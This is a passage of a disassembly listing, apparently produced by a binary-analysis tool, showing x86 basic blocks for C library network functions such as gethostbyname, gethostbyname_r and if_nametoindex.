v
0xb0fda41:	mov	eax, dword ptr [ebx + 0x3a58]
0xb0fda47:	cmp	eax, 0
0xb0fda4a:	jle	0xb0fdc78
None
|
|
|
v
0xb0fda20:	push	ebp
0xb0fda21:	mov	ebp, esp
0xb0fda23:	push	edi
0xb0fda24:	push	esi
0xb0fda25:	push	ebx
0xb0fda26:	sub	esp, 0x4c
0xb0fda29:	mov	edi, dword ptr [ebp + 0x24]
0xb0fda2c:	call	0xb1267db
None
|
|
|
v
0xb0fdc09:	mov	edx, dword ptr [ebp + 0x14]
0xb0fdc0c:	mov	eax, dword ptr [ebp + 0x20]
0xb0fdc0f:	mov	dword ptr [eax], edx
0xb0fdc11:	mov	dword ptr [esp], edx
0xb0fdc14:	call	0xb10b6e0
None
|
|
|
v
0xb0fdaf5:	test	eax, eax
0xb0fdaf7:	jne	0xb0fdc00
None
|
|
|
v
0xb0fdb8c:	cmp	esi, 0xfe
0xb0fdb8f:	mov	eax, ecx
0xb0fdb91:	je	0xb0fdd4e
None
|
|
|
v
0xb0fdda3:	mov	eax, ecx
0xb0fdda5:	jmp	0xb0fdb97
None
|
|
|
v
0xb0fdd00:	mov	edx, dword ptr [ebp - 0x30]
0xb0fdd03:	cmp	eax, 0xff
0xb0fdd06:	je	0xb0fddaa
None
|
|
|
v
0xb0fdc26:	mov	edx, dword ptr [ebp - 0x2c]
0xb0fdc29:	mov	ecx, dword ptr [ebp - 0x30]
0xb0fdc2c:	mov	dword ptr [edx + ecx], eax
0xb0fdc2f:	lea	esp, dword ptr [ebp - 0xc]
0xb0fdc32:	pop	ebx
0xb0fdc33:	pop	esi
0xb0fdc34:	pop	edi
0xb0fdc35:	pop	ebp
0xb0fdc36:	ret	
None
|
|
|
v
0xb0fda5c:	mov	dword ptr [ebx + 0x3a58], eax
0xb0fda62:	cmp	byte ptr [ebx + 0x299c], 0
0xb0fda69:	je	0xb0fdc90
None
|
|
|
v
0xb0fdd71:	mov	eax, dword ptr [ebp + 0x20]
0xb0fdd74:	mov	esi, 0xffffffff
0xb0fdd79:	mov	edx, dword ptr [ebp - 0x2c]
0xb0fdd7c:	mov	dword ptr [eax], 0
0xb0fdd82:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fdd88:	cmp	dword ptr [edx + eax], 2
0xb0fdd8c:	mov	dword ptr [ebp - 0x30], eax
0xb0fdd8f:	sete	al
0xb0fdd92:	movzx	eax, al
0xb0fdd95:	lea	eax, dword ptr [eax*4 - 1]
0xb0fdd9c:	mov	dword ptr [edi], eax
0xb0fdd9e:	jmp	0xb0fdb7a
None
|
|
|
v
0xb0fdccd:	mov	byte ptr [ebx + 0x299c], 1
0xb0fdcd4:	jmp	0xb0fdaa6
None
|
|
|
v
0xb0fdd18:	mov	eax, dword ptr [ebp - 0x1c]
0xb0fdd1b:	xor	eax, dword ptr gs:[0x18]
0xb0fdd22:	rol	eax, 9
0xb0fdd25:	mov	dword ptr [ebx + 0x2994], eax
0xb0fdd2b:	mov	eax, dword ptr [ebp - 0x20]
0xb0fdd2e:	xor	eax, dword ptr gs:[0x18]
0xb0fdd35:	rol	eax, 9
0xb0fdd38:	mov	dword ptr [ebx + 0x2998], eax
0xb0fdd3e:	jmp	0xb0fdccd
None
|
|
|
v
0xb0fdac8:	lea	eax, dword ptr [ebp - 0x1c]
0xb0fdacb:	mov	dword ptr [esp + 0xc], eax
0xb0fdacf:	mov	eax, dword ptr [ebp - 0x34]
0xb0fdad2:	mov	dword ptr [esp + 0x14], 0
0xb0fdada:	mov	dword ptr [esp + 0x10], esi
0xb0fdade:	mov	dword ptr [esp + 8], 0
0xb0fdae6:	mov	dword ptr [esp + 4], eax
0xb0fdaea:	lea	eax, dword ptr [ebp - 0x20]
0xb0fdaed:	mov	dword ptr [esp], eax
0xb0fdaf0:	call	0xb10cd30
None
|
|
|
v
0xb0fdd4e:	cmp	dword ptr [edi], -1
0xb0fdd51:	je	0xb0fdda3
None
|
|
|
v
0xb0fdd64:	mov	dword ptr [ebp - 0x30], edx
0xb0fdd67:	call	0xb10b670
None
|
|
|
v
0xb0fdbf3:	test	eax, eax
0xb0fdbf5:	jns	0xb0fdb97
None
|
|
|
v
0xb0fdb56:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fdb59:	mov	ecx, dword ptr [ebp - 0x30]
0xb0fdb5c:	cmp	dword ptr [eax + ecx], 0x22
0xb0fdb60:	jne	0xb0fdac8
None
|
|
|
v
0xb0fdc55:	test	eax, eax
0xb0fdc57:	jne	0xb0fda41
None
|
|
|
v
0xb0fdcd9:	mov	dword ptr [ebp - 0x30], eax
0xb0fdcdc:	mov	eax, dword ptr gs:[0]
0xb0fdce2:	mov	dword ptr [esp + 4], 0
0xb0fdcea:	mov	edx, eax
0xb0fdcec:	mov	dword ptr [ebp - 0x2c], eax
0xb0fdcef:	mov	eax, dword ptr [ebx - 0x10]
0xb0fdcf5:	mov	eax, dword ptr [edx + eax]
0xb0fdcf8:	mov	dword ptr [esp], eax
0xb0fdcfb:	call	0xb10bc20
None
|
|
|
v
0xb0fdd6c:	mov	edx, dword ptr [ebp - 0x30]
0xb0fdd6f:	jmp	0xb0fdd18
None
|
|
|
v
0xb0fdb66:	nop	
None
|
|
|
v
0xb0fdc00:	cmp	esi, 1
0xb0fdc03:	jne	0xb0fdb68
None
|
|
|
v
0xb0fdaae:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fdab4:	mov	dword ptr [ebp - 0x30], eax
0xb0fdab7:	lea	eax, dword ptr [ebx - 0x47ac0]
0xb0fdabd:	mov	dword ptr [ebp - 0x34], eax
0xb0fdac0:	jmp	0xb0fdafd
None
|
|
|
v
0xb0fdd53:	mov	eax, 0xb
0xb0fdd58:	jmp	0xb0fdc26
None
|
|
|
v
0xb0fdb42:	cmp	eax, 0xfe
0xb0fdb45:	mov	esi, eax
0xb0fdb47:	jne	0xb0fdac8
None
|
|
|
v
0xb0fdb08:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fdb0b:	add	eax, dword ptr [ebp - 0x30]
0xb0fdb0e:	mov	dword ptr [esp + 0x1c], edi
0xb0fdb12:	mov	dword ptr [esp + 0x18], eax
0xb0fdb16:	mov	eax, dword ptr [ebp + 0x1c]
0xb0fdb19:	mov	dword ptr [esp + 0x14], eax
0xb0fdb1d:	mov	eax, dword ptr [ebp + 0x18]
0xb0fdb20:	mov	dword ptr [esp + 0x10], eax
0xb0fdb24:	mov	eax, dword ptr [ebp + 0x14]
0xb0fdb27:	mov	dword ptr [esp + 0xc], eax
0xb0fdb2b:	mov	eax, dword ptr [ebp + 0x10]
0xb0fdb2e:	mov	dword ptr [esp + 8], eax
0xb0fdb32:	mov	eax, dword ptr [ebp + 0xc]
0xb0fdb35:	mov	dword ptr [esp + 4], eax
0xb0fdb39:	mov	eax, dword ptr [ebp + 8]
0xb0fdb3c:	mov	dword ptr [esp], eax
0xb0fdb3f:	call	dword ptr [ebp - 0x1c]
None
|
|
|
v
0xb0fdc7e:	cmp	byte ptr [ebx + 0x299c], 0
0xb0fdc85:	jne	0xb0fda6f
None
|
|
|
v
0xb0fdb68:	mov	eax, dword ptr [ebp + 0x20]
0xb0fdb6b:	cmp	esi, 1
0xb0fdb6e:	mov	dword ptr [eax], 0
0xb0fdb74:	jbe	0xb0fdd5d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostbyname
TOTAL BLOCKS :32
0xb0fdde3:	add	ebx, 0xad21d
0xb0fdde9:	mov	dword ptr [esp + 0x3c], 0
0xb0fddf1:	cmp	dword ptr gs:[0xc], 0
0xb0fddf9:	je	0xb0fddfc
None
|
|
|
v
0xb0fddfb:	lock cmpxchg	dword ptr [ebx + 0x29b8], ecx
0xb0fde03:	jne	0xb0fdf85
None
|
|
|
v
0xb0fdee0:	test	eax, eax
0xb0fdee2:	jne	0xb0fde80
None
|
|
|
v
0xb0fdf34:	mov	edx, dword ptr [ebx - 0xe4]
0xb0fdf3a:	mov	ecx, dword ptr gs:[0]
0xb0fdf41:	mov	dword ptr [ecx + edx], eax
0xb0fdf44:	mov	eax, dword ptr [esp + 0x38]
0xb0fdf48:	add	esp, 0x4c
0xb0fdf4b:	pop	ebx
0xb0fdf4c:	pop	esi
0xb0fdf4d:	pop	edi
0xb0fdf4e:	pop	ebp
0xb0fdf4f:	ret	
None
|
|
|
v
0xb0fde7b:	jmp	0xb0fdf10
None
|
|
|
v
0xb0fddd0:	push	ebp
0xb0fddd1:	xor	eax, eax
0xb0fddd3:	push	edi
0xb0fddd4:	mov	ecx, 1
0xb0fddd9:	push	esi
0xb0fddda:	push	ebx
0xb0fdddb:	sub	esp, 0x4c
0xb0fddde:	call	0xb1267db
None
|
|
|
v
0xb0fdf76:	test	eax, eax
0xb0fdf78:	mov	dword ptr [ebx + 0xf28], eax
0xb0fdf7e:	je	0xb0fdf10
None
|
|
|
v
0xb0fdfa0:	jmp	0xb0fdf2c
None
|
|
|
v
0xb0fdf2c:	mov	eax, dword ptr [esp + 0x3c]
0xb0fdf30:	test	eax, eax
0xb0fdf32:	je	0xb0fdf44
None
|
|
|
v
0xb0fdf60:	mov	dword ptr [esp], 0x400
0xb0fdf67:	mov	dword ptr [ebx + 0x29b4], 0x400
0xb0fdf71:	call	0xb0173f0
None
|
|
|
v
0xb0fde71:	mov	eax, dword ptr [ebx + 0xf28]
0xb0fde77:	test	eax, eax
0xb0fde79:	jne	0xb0fde86
None
|
|
|
v
0xb0fdf22:	lock sub	dword ptr [ebx + 0x29b8], 1
None
|
|
|
v
0xb0fdee4:	mov	eax, dword ptr [ebx + 0xf28]
0xb0fdeea:	mov	dword ptr [esp], eax
0xb0fdeed:	call	0xb017470
None
|
|
|
v
0xb0fde80:	mov	dword ptr [ebx + 0xf28], eax
0xb0fde86:	mov	edx, dword ptr [ebx + 0x29b4]
0xb0fde8c:	mov	dword ptr [esp + 8], eax
0xb0fde90:	mov	eax, dword ptr [esp + 0x60]
0xb0fde94:	mov	dword ptr [esp + 0x14], ebp
0xb0fde98:	mov	dword ptr [esp + 0x10], edi
0xb0fde9c:	mov	dword ptr [esp + 0xc], edx
0xb0fdea0:	mov	dword ptr [esp + 4], esi
0xb0fdea4:	mov	dword ptr [esp], eax
0xb0fdea7:	call	0xb0fe560
None
|
|
|
v
0xb0fdef2:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fdef8:	mov	edx, dword ptr gs:[0]
0xb0fdeff:	mov	dword ptr [ebx + 0xf28], 0
0xb0fdf09:	mov	dword ptr [edx + eax], 0xc
0xb0fdf10:	mov	dword ptr [esp + 0x38], 0
0xb0fdf18:	cmp	dword ptr gs:[0xc], 0
0xb0fdf20:	je	0xb0fdf23
None
|
|
|
v
0xb0fdf2a:	jne	0xb0fdf95
None
|
|
|
v
0xb0fdeac:	cmp	eax, 0x22
0xb0fdeaf:	jne	0xb0fdf50
None
|
|
|
v
0xb0fdf18:	cmp	dword ptr gs:[0xc], 0
0xb0fdf20:	je	0xb0fdf23
None
|
|
|
v
0xb0fde17:	lea	eax, dword ptr [ebx + 0x29b4]
0xb0fde1d:	mov	dword ptr [esp + 0xc], eax
0xb0fde21:	lea	eax, dword ptr [ebx + 0xf28]
0xb0fde27:	mov	dword ptr [esp + 8], eax
0xb0fde2b:	mov	eax, dword ptr [esp + 0x60]
0xb0fde2f:	lea	ebp, dword ptr [esp + 0x3c]
0xb0fde33:	lea	edi, dword ptr [esp + 0x38]
0xb0fde37:	lea	esi, dword ptr [ebx + 0x29a0]
0xb0fde3d:	mov	dword ptr [esp + 0x20], ebp
0xb0fde41:	mov	dword ptr [esp + 0x1c], 2
0xb0fde49:	mov	dword ptr [esp + 0x18], 0
0xb0fde51:	mov	dword ptr [esp + 0x14], edi
0xb0fde55:	mov	dword ptr [esp + 0x10], 0
0xb0fde5d:	mov	dword ptr [esp + 4], esi
0xb0fde61:	mov	dword ptr [esp], eax
0xb0fde64:	call	0xb10dd20
None
|
|
|
v
0xb0fde09:	mov	edx, dword ptr [ebx + 0xf28]
0xb0fde0f:	test	edx, edx
0xb0fde11:	je	0xb0fdf60
None
|
|
|
v
0xb0fdf85:	lea	ecx, dword ptr [ebx + 0x29b8]
0xb0fdf8b:	call	0xb0f9430
None
|
|
|
v
0xb0fdf5a:	jmp	0xb0fdf10
None
|
|
|
v
0xb0fdf44:	mov	eax, dword ptr [esp + 0x38]
0xb0fdf48:	add	esp, 0x4c
0xb0fdf4b:	pop	ebx
0xb0fdf4c:	pop	esi
0xb0fdf4d:	pop	edi
0xb0fdf4e:	pop	ebp
0xb0fdf4f:	ret	
None
|
|
|
v
0xb0fdf80:	jmp	0xb0fde17
None
|
|
|
v
0xb0fdf95:	lea	eax, dword ptr [ebx + 0x29b8]
0xb0fdf9b:	call	0xb0f9460
None
|
|
|
v
0xb0fdec0:	mov	eax, dword ptr [ebx + 0x29b4]
0xb0fdec6:	add	eax, eax
0xb0fdec8:	mov	dword ptr [ebx + 0x29b4], eax
0xb0fdece:	mov	dword ptr [esp + 4], eax
0xb0fded2:	mov	eax, dword ptr [ebx + 0xf28]
0xb0fded8:	mov	dword ptr [esp], eax
0xb0fdedb:	call	0xb0173e0
None
|
|
|
v
0xb0fdf90:	jmp	0xb0fde09
None
|
|
|
v
0xb0fdf50:	mov	eax, dword ptr [ebx + 0xf28]
0xb0fdf56:	test	eax, eax
0xb0fdf58:	jne	0xb0fdf18
None
|
|
|
v
0xb0fde86:	mov	edx, dword ptr [ebx + 0x29b4]
0xb0fde8c:	mov	dword ptr [esp + 8], eax
0xb0fde90:	mov	eax, dword ptr [esp + 0x60]
0xb0fde94:	mov	dword ptr [esp + 0x14], ebp
0xb0fde98:	mov	dword ptr [esp + 0x10], edi
0xb0fde9c:	mov	dword ptr [esp + 0xc], edx
0xb0fdea0:	mov	dword ptr [esp + 4], esi
0xb0fdea4:	mov	dword ptr [esp], eax
0xb0fdea7:	call	0xb0fe560
None
|
|
|
v
0xb0fde69:	test	eax, eax
0xb0fde6b:	jne	0xb0fdf18
None
|
|
|
v
0xb0fdf10:	mov	dword ptr [esp + 0x38], 0
0xb0fdf18:	cmp	dword ptr gs:[0xc], 0
0xb0fdf20:	je	0xb0fdf23
None
|
|
|
v
0xb0fdeb5:	cmp	dword ptr [esp + 0x3c], -1
0xb0fdeba:	jne	0xb0fdf50
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostbyname_r
TOTAL BLOCKS :58
0xb0fe7fd:	xor	edx, edx
0xb0fe7ff:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fe802:	mov	dword ptr [eax + edi], edx
0xb0fe805:	lea	esp, dword ptr [ebp - 0xc]
0xb0fe808:	mov	eax, edx
0xb0fe80a:	pop	ebx
0xb0fe80b:	pop	esi
0xb0fe80c:	pop	edi
0xb0fe80d:	pop	ebp
0xb0fe80e:	ret	
None
|
|
|
v
0xb0fe8ea:	mov	edx, ecx
0xb0fe8ec:	jmp	0xb0fe631
None
|
|
|
v
0xb0fe858:	je	0xb0fe782
None
|
|
|
v
0xb0fe7bd:	test	eax, eax
0xb0fe7bf:	mov	edx, eax
0xb0fe7c1:	jns	0xb0fe631
None
|
|
|
v
0xb0fe65b:	mov	dword ptr [ebx + 0x3a58], eax
0xb0fe661:	cmp	byte ptr [ebx + 0x29ec], 0
0xb0fe668:	je	0xb0fe878
None
|
|
|
v
0xb0fe733:	cmp	dword ptr [esi], -1
0xb0fe736:	jne	0xb0fe6c0
None
|
|
|
v
0xb0fe7e4:	mov	ecx, dword ptr [ebp + 0xc]
0xb0fe7e7:	mov	dword ptr [eax], ecx
0xb0fe7e9:	mov	dword ptr [esp], ecx
0xb0fe7ec:	call	0xb10b6e0
None
|
|
|
v
0xb0fe700:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fe703:	mov	dword ptr [esp + 0x14], esi
0xb0fe707:	add	eax, edi
0xb0fe709:	mov	dword ptr [esp + 0x10], eax
0xb0fe70d:	mov	eax, dword ptr [ebp + 0x14]
0xb0fe710:	mov	dword ptr [esp + 0xc], eax
0xb0fe714:	mov	eax, dword ptr [ebp + 0x10]
0xb0fe717:	mov	dword ptr [esp + 8], eax
0xb0fe71b:	mov	eax, dword ptr [ebp + 0xc]
0xb0fe71e:	mov	dword ptr [esp + 4], eax
0xb0fe722:	mov	eax, dword ptr [ebp + 8]
0xb0fe725:	mov	dword ptr [esp], eax
0xb0fe728:	call	dword ptr [ebp - 0x20]
None
|
|
|
v
0xb0fe7c7:	jmp	0xb0fe661
None
|
|
|
v
0xb0fe7d0:	mov	edx, dword ptr [ebp - 0x1c]
0xb0fe7d3:	mov	ecx, 1
0xb0fe7d8:	mov	eax, dword ptr [ebp + 0x18]
0xb0fe7db:	cmp	edx, 1
0xb0fe7de:	jne	0xb0fe5f1
None
|
|
|
v
0xb0fe5ce:	mov	eax, dword ptr gs:[0]
0xb0fe5d4:	mov	ecx, 1
0xb0fe5d9:	mov	edi, dword ptr [ebx - 0xdc]
0xb0fe5df:	mov	dword ptr [ebp - 0x2c], eax
0xb0fe5e2:	mov	edx, dword ptr [ebp - 0x1c]
0xb0fe5e5:	mov	eax, dword ptr [ebp + 0x18]
0xb0fe5e8:	cmp	edx, 1
0xb0fe5eb:	je	0xb0fe7e4
None
|
|
|
v
0xb0fe631:	lea	esp, dword ptr [ebp - 0xc]
0xb0fe634:	mov	eax, edx
0xb0fe636:	pop	ebx
0xb0fe637:	pop	esi
0xb0fe638:	pop	edi
0xb0fe639:	pop	ebp
0xb0fe63a:	ret	
None
|
|
|
v
0xb0fe606:	mov	dword ptr [esi], 3
0xb0fe60c:	mov	eax, edx
0xb0fe60e:	cmp	eax, 1
0xb0fe611:	jbe	0xb0fe7fd
None
|
|
|
v
0xb0fe90f:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fe912:	jmp	0xb0fe8a1
None
|
|
|
v
0xb0fe60e:	cmp	eax, 1
0xb0fe611:	jbe	0xb0fe7fd
None
|
|
|
v
0xb0fe84b:	mov	edx, 0xb
0xb0fe850:	jmp	0xb0fe7ff
None
|
|
|
v
0xb0fe69d:	test	eax, eax
0xb0fe69f:	jne	0xb0fe8f1
None
|
|
|
v
0xb0fe661:	cmp	byte ptr [ebx + 0x29ec], 0
0xb0fe668:	je	0xb0fe878
None
|
|
|
v
0xb0fe8a1:	mov	edx, dword ptr [ebp - 0x20]
0xb0fe8a4:	xor	edx, dword ptr gs:[0x18]
0xb0fe8ab:	rol	edx, 9
0xb0fe8ae:	mov	dword ptr [ebx + 0x29e4], edx
0xb0fe8b4:	mov	edx, dword ptr [ebp - 0x24]
0xb0fe8b7:	xor	edx, dword ptr gs:[0x18]
0xb0fe8be:	rol	edx, 9
0xb0fe8c1:	mov	dword ptr [ebx + 0x29e8], edx
0xb0fe8c7:	mov	byte ptr [ebx + 0x29ec], 1
0xb0fe8ce:	jmp	0xb0fe69d
None
|
|
|
v
0xb0fe72b:	cmp	eax, 0xfe
0xb0fe72e:	mov	dword ptr [ebp - 0x1c], eax
0xb0fe731:	jne	0xb0fe6c0
None
|
|
|
v
0xb0fe8f1:	mov	eax, dword ptr gs:[0]
0xb0fe8f7:	xor	ecx, ecx
0xb0fe8f9:	mov	edi, dword ptr [ebx - 0xdc]
0xb0fe8ff:	mov	dword ptr [ebp - 0x2c], eax
0xb0fe902:	jmp	0xb0fe5e2
None
|
|
|
v
0xb0fe617:	mov	ecx, dword ptr [ebp - 0x2c]
0xb0fe61a:	mov	ecx, dword ptr [ecx + edi]
0xb0fe61d:	cmp	ecx, 0x22
0xb0fe620:	je	0xb0fe838
None
|
|
|
v
0xb0fe6f5:	mov	eax, dword ptr [ebp - 0x20]
0xb0fe6f8:	mov	dword ptr [esp], eax
0xb0fe6fb:	call	0xb123900
None
|
|
|
v
0xb0fe5c0:	cmp	eax, 0xff
0xb0fe5c3:	je	0xb0fe758
None
|
|
|
v
0xb0fe5c9:	cmp	eax, 1
0xb0fe5cc:	jne	0xb0fe640
None
|
|
|
v
0xb0fe895:	mov	edx, dword ptr [ebx - 0xfc]
0xb0fe89b:	mov	edx, dword ptr [edx]
0xb0fe89d:	test	edx, edx
0xb0fe89f:	je	0xb0fe907
None
|
|
|
v
0xb0fe85e:	nop	
0xb0fe860:	jmp	0xb0fe661
None
|
|
|
v
0xb0fe814:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fe817:	cmp	dword ptr [eax + edi], 2
0xb0fe81b:	je	0xb0fe606
None
|
|
|
v
0xb0fe782:	lea	eax, dword ptr [ebx + 0x3930]
0xb0fe788:	cmp	byte ptr [eax + 4], 0
0xb0fe78c:	jne	0xb0fe661
None
|
|
|
v
0xb0fe810:	test	cl, cl
0xb0fe812:	jne	0xb0fe868
None
|
|
|
v
0xb0fe8c7:	mov	byte ptr [ebx + 0x29ec], 1
0xb0fe8ce:	jmp	0xb0fe69d
None
|
|
|
v
0xb0fe6c0:	mov	dword ptr [esp + 0x10], eax
0xb0fe6c4:	lea	eax, dword ptr [ebp - 0x20]
0xb0fe6c7:	mov	dword ptr [esp + 0xc], eax
0xb0fe6cb:	mov	eax, dword ptr [ebp - 0x30]
0xb0fe6ce:	mov	dword ptr [esp + 0x14], 0
0xb0fe6d6:	mov	dword ptr [esp + 8], 0
0xb0fe6de:	mov	dword ptr [esp + 4], eax
0xb0fe6e2:	lea	eax, dword ptr [ebp - 0x24]
0xb0fe6e5:	mov	dword ptr [esp], eax
0xb0fe6e8:	call	0xb10cd30
None
|
|
|
v
0xb0fe821:	mov	dword ptr [esi], 0xffffffff
0xb0fe827:	mov	eax, 0xffffffff
0xb0fe82c:	jmp	0xb0fe617
None
|
|
|
v
0xb0fe6a5:	mov	eax, dword ptr gs:[0]
0xb0fe6ab:	mov	edi, dword ptr [ebx - 0xdc]
0xb0fe6b1:	mov	dword ptr [ebp - 0x2c], eax
0xb0fe6b4:	lea	eax, dword ptr [ebx - 0x47ab0]
0xb0fe6ba:	mov	dword ptr [ebp - 0x30], eax
0xb0fe6bd:	jmp	0xb0fe6f5
None
|
|
|
v
0xb0fe7ff:	mov	eax, dword ptr [ebp - 0x2c]
0xb0fe802:	mov	dword ptr [eax + edi], edx
0xb0fe805:	lea	esp, dword ptr [ebp - 0xc]
0xb0fe808:	mov	eax, edx
0xb0fe80a:	pop	ebx
0xb0fe80b:	pop	esi
0xb0fe80c:	pop	edi
0xb0fe80d:	pop	ebp
0xb0fe80e:	ret	
None
|
|
|
v
0xb0fe758:	mov	eax, dword ptr [ebx - 0xdc]
0xb0fe75e:	mov	edx, dword ptr gs:[0]
0xb0fe765:	mov	edx, dword ptr [edx + eax]
0xb0fe768:	lea	esp, dword ptr [ebp - 0xc]
0xb0fe76b:	pop	ebx
0xb0fe76c:	pop	esi
0xb0fe76d:	pop	edi
0xb0fe76e:	mov	eax, edx
0xb0fe770:	pop	ebp
0xb0fe771:	ret	
None
|
|
|
v
0xb0fe745:	mov	ecx, dword ptr [ebp + 0x18]
0xb0fe748:	mov	dword ptr [ecx], 0
0xb0fe74e:	jmp	0xb0fe617
None
|
|
|
v
0xb0fe8d3:	mov	edx, 0xffffffff
0xb0fe8d8:	xor	edx, dword ptr gs:[0x18]
0xb0fe8df:	rol	edx, 9
0xb0fe8e2:	mov	dword ptr [ebx + 0x29e8], edx
0xb0fe8e8:	jmp	0xb0fe8c7
None
|
|
|
v
0xb0fe7f1:	mov	eax, dword ptr [ebp - 0x1c]
0xb0fe7f4:	cmp	eax, 1
0xb0fe7f7:	ja	0xb0fe617
None
|
|
|
v
0xb0fe57b:	add	ebx, 0xaca85
0xb0fe581:	mov	dword ptr [esp + 0x20], esi
0xb0fe585:	mov	dword ptr [esp + 0x1c], 2
0xb0fe58d:	mov	dword ptr [esp + 0x14], eax
0xb0fe591:	mov	eax, dword ptr [ebp + 0x14]
0xb0fe594:	mov	dword ptr [esp + 0xc], 0
0xb0fe59c:	mov	dword ptr [ebp - 0x1c], 0xffffffff
0xb0fe5a3:	mov	dword ptr [esp + 0x10], eax
0xb0fe5a7:	lea	eax, dword ptr [ebp + 0x10]
0xb0fe5aa:	mov	dword ptr [esp + 8], eax
0xb0fe5ae:	mov	eax, dword ptr [ebp + 0xc]
0xb0fe5b1:	mov	dword ptr [esp + 4], eax
0xb0fe5b5:	mov	eax, dword ptr [ebp + 8]
0xb0fe5b8:	mov	dword ptr [esp], eax
0xb0fe5bb:	call	0xb10dd20
None
|
|
|
v
0xb0fe5e2:	mov	edx, dword ptr [ebp - 0x1c]
0xb0fe5e5:	mov	eax, dword ptr [ebp + 0x18]
0xb0fe5e8:	cmp	edx, 1
0xb0fe5eb:	je	0xb0fe7e4
None
|
|
|
v
0xb0fe738:	mov	ecx, dword ptr [ebp - 0x2c]
0xb0fe73b:	cmp	dword ptr [ecx + edi], 0x22
0xb0fe73f:	jne	0xb0fe6c0
None
|
|
|
v
0xb0fe792:	mov	eax, dword ptr [ebp + 0x18]
0xb0fe795:	mov	dword ptr [esp + 0x14], esi
0xb0fe799:	mov	dword ptr [esp + 0x10], eax
0xb0fe79d:	mov	eax, dword ptr [ebp + 0x14]
0xb0fe7a0:	mov	dword ptr [esp + 0xc], eax
0xb0fe7a4:	mov	eax, dword ptr [ebp + 0x10]
0xb0fe7a7:	mov	dword ptr [esp + 8], eax
0xb0fe7ab:	mov	eax, dword ptr [ebp + 0xc]
0xb0fe7ae:	mov	dword ptr [esp + 4], eax
0xb0fe7b2:	mov	eax, dword ptr [ebp + 8]
0xb0fe7b5:	mov	dword ptr [esp], eax
0xb0fe7b8:	call	0xb11dbd0
None
|
|
|
v
0xb0fe838:	cmp	eax, 0xfe
0xb0fe83b:	mov	edx, 0x16
0xb0fe840:	jne	0xb0fe7ff
None
|
|
|
v
0xb0fe64f:	add	eax, 1
0xb0fe652:	cmp	eax, 0x64
0xb0fe655:	jg	0xb0fe778
None
|
|
|
v
0xb0fe560:	push	ebp
0xb0fe561:	mov	ebp, esp
0xb0fe563:	push	edi
0xb0fe564:	push	esi
0xb0fe565:	push	ebx
0xb0fe566:	sub	esp, 0x4c
0xb0fe569:	mov	esi, dword ptr [ebp + 0x1c]
0xb0fe56c:	lea	eax, dword ptr [ebp - 0x1c]
0xb0fe56f:	mov	dword ptr [esp + 0x18], eax
0xb0fe573:	mov	eax, dword ptr [ebp + 0x18]
0xb0fe576:	call	0xb1267db
None
|
|
|
v
0xb0fe868:	mov	eax, 0xffffffff
0xb0fe86d:	lea	esi, dword ptr [esi]
0xb0fe870:	jmp	0xb0fe617
None
|
|
|
v
0xb0fe842:	cmp	dword ptr [esi], -1
0xb0fe845:	je	0xb0fe8ea
None
|
|
|
v
0xb0fe640:	mov	eax, dword ptr [ebx + 0x3a58]
0xb0fe646:	cmp	eax, 0
0xb0fe649:	jle	0xb0fe858
None
|
|
|
v
0xb0fe626:	cmp	eax, 0xfe
0xb0fe629:	mov	edx, ecx
0xb0fe62b:	je	0xb0fe842
None
|
|
|
v
0xb0fe66e:	mov	eax, dword ptr [ebx + 0x29e4]
0xb0fe674:	ror	eax, 9
0xb0fe677:	xor	eax, dword ptr gs:[0x18]
0xb0fe67e:	mov	dword ptr [ebp - 0x20], eax
0xb0fe681:	mov	eax, dword ptr [ebx + 0x29e8]
0xb0fe687:	ror	eax, 9
0xb0fe68a:	xor	eax, dword ptr gs:[0x18]
0xb0fe691:	cmp	eax, 0xff
0xb0fe694:	mov	dword ptr [ebp - 0x24], eax
0xb0fe697:	sete	al
0xb0fe69a:	movzx	eax, al
0xb0fe69d:	test	eax, eax
0xb0fe69f:	jne	0xb0fe8f1
None
|
|
|
v
0xb0fe88e:	sub	esp, 4
0xb0fe891:	test	eax, eax
0xb0fe893:	jne	0xb0fe8d3
None
|
|
|
v
0xb0fe778:	mov	dword ptr [ebx + 0x3a58], 0
0xb0fe782:	lea	eax, dword ptr [ebx + 0x3930]
0xb0fe788:	cmp	byte ptr [eax + 4], 0
0xb0fe78c:	jne	0xb0fe661
None
|
|
|
v
0xb0fe600:	test	cl, cl
0xb0fe602:	mov	eax, edx
0xb0fe604:	jne	0xb0fe60e
None
|
|
|
v
0xb0fe6ed:	test	eax, eax
0xb0fe6ef:	jne	0xb0fe7d0
None
|
|
|
v
0xb0fe878:	lea	edx, dword ptr [ebp - 0x20]
0xb0fe87b:	xor	ecx, ecx
0xb0fe87d:	mov	dword ptr [esp], edx
0xb0fe880:	lea	eax, dword ptr [ebp - 0x24]
0xb0fe883:	lea	edx, dword ptr [ebx - 0x47ab0]
0xb0fe889:	call	0xb10d930
None
|
|
|
v
0xb0fe907:	mov	dword ptr [ebp - 0x2c], eax
0xb0fe90a:	call	0xb10b670
None
|
|
|
v
0xb0fe5f1:	cmp	edx, 0xff
0xb0fe5f4:	mov	dword ptr [eax], 0
0xb0fe5fa:	je	0xb0fe810
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:if_nametoindex
TOTAL BLOCKS :12
0xb103735:	xchg	ebx, ecx
0xb103737:	mov	eax, dword ptr [esp + 0x20]
0xb10373b:	add	esp, 0x3c
0xb10373e:	pop	ebx
0xb10373f:	pop	esi
0xb103740:	pop	edi
0xb103741:	pop	ebp
0xb103742:	ret	
None
|
|
|
v
0xb103725:	mov	ecx, esi
0xb103727:	xchg	ebx, ecx
0xb103729:	mov	eax, 6
0xb10372e:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb1036f1:	mov	eax, dword ptr [esp + 0x50]
0xb1036f5:	lea	edi, dword ptr [esp + 0x10]
0xb1036f9:	mov	dword ptr [esp + 8], 0x10
0xb103701:	mov	dword ptr [esp], edi
0xb103704:	mov	dword ptr [esp + 4], eax
0xb103708:	call	0xb0830a0
None
|
